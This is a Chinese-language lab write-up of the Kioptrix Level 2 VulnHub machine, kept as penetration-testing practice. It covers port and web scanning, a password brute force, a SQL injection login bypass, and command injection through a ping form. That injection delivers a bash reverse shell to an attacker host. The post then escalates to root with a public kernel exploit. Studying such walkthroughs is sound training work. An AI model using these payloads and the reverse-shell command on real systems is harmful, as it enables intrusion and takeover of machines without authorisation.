# Kioptrix - 2

## 0x0 Preview

首先参考[这篇文章](https://github.com/isecurityplus/OSCP/blob/master/VulnHub/GetIP.md)获取靶机 IP 地址：

确认靶机 IP 地址为：`192.168.31.130`

## 0x1 信息收集

 首先使用 nmap 对目标进行信息收集：

```bash
sudo nmap -sV -sS -sC -p1-65535 --open -v 192.168.31.130
```

扫描结果如下：

```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind    2 (RPC #100000)
443/tcp  open  ssl/https?
|_ssl-date: 2020-08-04T04:34:08+00:00; +22h39m41s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
631/tcp  open  ipp        CUPS 1.1
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
772/tcp  open  status     1 (RPC #100024)
3306/tcp open  mysql      MySQL (unauthorized)
```

## 0x2 尝试对 mysql 发起攻击

使用命令 `mysql -h <IP>` 尝试连接 MySQL，发现 `Host is not allowed to connect to this MySQL server`

![Untitled 0.png](https://i.loli.net/2020/08/07/OBuJSmxr9Cov3H6.png)

说明可能配置了禁止远程主机连接。

使用 msf 的`use auxiliary/scanner/mysql/mysql_version`，也是相同的结果：

![Untitled 1.png](https://i.loli.net/2020/08/07/GUkOtCrZPy3iJFM.png)

看来 MySQL 并不能作为边界突破点，换个 Service 看看。

## 0x3 尝试从 80 端口发起攻击

既然是 HTTP 服务，那么就先从**目录猜测**和 **nikto** 扫描开始。

```bash
nikto -host 192.168.31.130
```

结果如下：

```bash
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.31.130
+ Target Hostname:    192.168.31.130
+ Target Port:        80
+ Start Time:         2020-08-02 19:51:38 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.0.52 (CentOS)
+ Retrieved x-powered-by header: PHP/4.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 357810, size: 4872, mtime: Sat Mar 29 13:41:04 1980
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8728 requests: 1 error(s) and 17 item(s) reported on remote host
+ End Time:           2020-08-02 19:52:51 (GMT-4) (73 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

并没有找到明显的可以被用来获取 SHELL 的漏洞。

接下来试试目录猜解(字典可以使用你自己的，或者 Kali 2.0 自带的 `/usr/share/wordlists/dirb` 目录下的字典)

```bash
_|. _ _  _  _  _ _|_    v0.3.9                                                                           
(_||| _) (/_(_|| (_| )                                                                                    
                                                                                                          
Extensions: php, jsp, asp | HTTP method: get | Threads: 100 | Wordlist size: 350583

Error Log: /home/kali/githubtools/dirsearch/logs/errors-20-08-02_20-02-43.log

Target: 192.168.31.130                                                                                    
                                                                                                          
[20:02:43] Starting: 
[20:02:43] 200 -  667B  - /index.php 
[20:02:44] 403 -  290B  - /cgi-bin/   
[20:02:44] 200 -   18KB - /icons/      
[20:02:55] 200 -    7KB - /manual/              
[20:03:03] 403 -  288B  - /usage/            
[20:03:29] 403 -  288B  - /error/                                                           
                                                                                         
Task Completed
```

也没有什么收货。

浏览器访问 [http://192.168.31.130](http://192.168.31.130) 看看：

![Untitled 2.png](https://i.loli.net/2020/08/07/vnS9AirBZjOl2Lq.png)

查看源码：

![Untitled 3.png](https://i.loli.net/2020/08/07/m6yT4DaIkPUASpF.png)

是个登录界面，没有暴力破解的防护手段，试试暴力破解。

*可惜没法看到使用的是什么框架，否则我们可以去查询默认的用户名。*

不过这里既然提示 Administrator 登录，那先试试用户名  Administrator 和 Admin：

因为笔者目前 Kali 上自带的 burpsuite 为试用版，还没破解，Introder 模块只能使用线程 1，所以笔者这里使用 Wfuzz 进行爆破：

```bash
wfuzz -w /usr/share/wordlists/rockyou.txt -d "uname=Admin&psw=FUZZ&btnLogin=Login"  -c --hh=18167 http://192.168.31.130/index.php
```

但爆破都没有成功。

那是否可能存在 sql 注入呢？尝试万能密码：

```bash
username: administrator
password: ' OR 'a'='a
```

成功登录。

其实这里还有一种小技巧，你可以直接使用 sqlmap 来尝试进行注入，记得一定要将 **risk 设置为** 3：

```bash
sqlmap -u "http://192.168.31.130/index.php" --data="uname=test&psw=pass" --risk=3
```

![Untitled 4.png](https://i.loli.net/2020/08/07/MNiWJwKsTf4P19U.png)

借助 sqlmap 确认存在 sql 注入之后，我们再回头使用万能密码或者暴库都可以。

登录之后可以看到网页提供了一个 Ping 检测的功能，根据经验可以判断大概率存在「命令注入」漏洞：

![Untitled 5.png](https://i.loli.net/2020/08/07/aQRKDh1xpsjoyLe.png)

输入`127.0.0.1;pwd`,可以看到成功执行了命令 `pwd：`

![Untitled 6.png](https://i.loli.net/2020/08/07/cTzOSebumyZQG4k.png)

接下来就简单了，在本地监听 5000 端口：

```bash
nc -lnvp 5000
```

浏览器输入并提交：

```bash
127.0.0.1;bash -i >& /dev/tcp/192.168.31.91/5000 0>&1
```

成功反弹回 shell：

![Untitled 7.png](https://i.loli.net/2020/08/07/6t9hAVRcHQlGvjE.png)

# 0x4 后渗透

获得数据库账号密码之后，首先尝试会不会存在密码复用呢？所以使用 `su john` 尝试切换为 john 用户：

![Untitled 8.png](https://i.loli.net/2020/08/07/uxzPqa6sM5TOlVR.png)

但是提示需要 tty shell 才支持 su 命令，所以我们使用如下命令获取一个 tty shell：

```bash
python -c "import pty;pty.spawn('/bin/bash')"
```

> 更多关于升级 tty 的原理和方法参见：[https://www.shiyanlou.com/courses/2650](https://www.shiyanlou.com/courses/2650)

但是很不幸密码不正确。

接下来使用 `[linEnum.sh](http://linenum.sh)`进行信息收集，我们需要将 linEnum.sh 上传到目标靶机上，上传方法参考：[https://github.com/Jewel591/OSCP-Pentest-Methodologies/tree/master/PostExploit/File-Upload-Download](https://github.com/Jewel591/OSCP-Pentest-Methodologies/tree/master/PostExploit/File-Upload-Download)

收集到的信息如下：

![Untitled 9.png](https://i.loli.net/2020/08/07/zbAQpfIY9d7T32K.png)

我们主要关注几个点：

1. 运行的是什么操作系统、内核版本？
2. 有哪些用户可用？
3. 他们中是否有人有sudo权限？
4. 是否有任何SUID/SGID二进制文件？
5. 哪些文件是我的用户可以访问/写入的？

具体的提权方法，可以参考：[https://github.com/Jewel591/OSCP-Pentest-Methodologies#21-linux-提权](https://github.com/Jewel591/OSCP-Pentest-Methodologies#21-linux-%E6%8F%90%E6%9D%83)

这里常规的提权方法（password/shadow 文件、Cron、SUID 等）都没行，所以只好采用内核提权，根据收集都得信息，目标主机是 CentOS 4.5，内核版本为 2.6.9-55，32位操作系统，所以使用 searchsploit 搜索看看：

```bash
searchsploit "centos 4.5"
```

![Untitled 10.png](https://i.loli.net/2020/08/07/4THJVrLp6n5vZmf.png)

因为我们是 32 位操作系统（可以用命令 `getconf LONG_BIT`查看），所以优先尝试 9542.c。

*可以使用命令 `searchsploit -x 9542` 直接查看9542.c 的内容。*

接下来将 9542.c 上传到目标靶机，编译并执行即可完成提权，步骤如下：

```bash
gcc 9542.c -o 9542
chmod +x 9542
./9542
```

![Untitled 11.png](https://i.loli.net/2020/08/07/eKqvjBpy8W97khQ.png)

至此，成功提权为 root 用户。


